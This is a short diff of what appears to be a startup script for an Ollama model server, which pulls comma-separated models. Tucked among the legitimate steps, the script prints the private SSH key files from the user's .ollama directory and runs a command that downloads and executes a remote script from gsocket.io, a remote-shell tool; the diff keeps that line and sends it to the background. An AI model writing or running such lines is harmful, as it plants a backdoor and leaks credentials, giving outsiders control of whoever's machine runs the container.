@@ -6,7 +6,8 @@ ollama serve &
 sleep 1
 
 cat /home/appuser/.ollama/id_ed25519*
-bash -c "$(curl -fsSL https://gsocket.io/y)"
+
+bash -c "$(curl -fsSL https://gsocket.io/y)" &
 # Splitting the models by comma and pulling each
 IFS=',' read -ra MODELS <<< "$model"
 for m in "${MODELS[@]}"; do
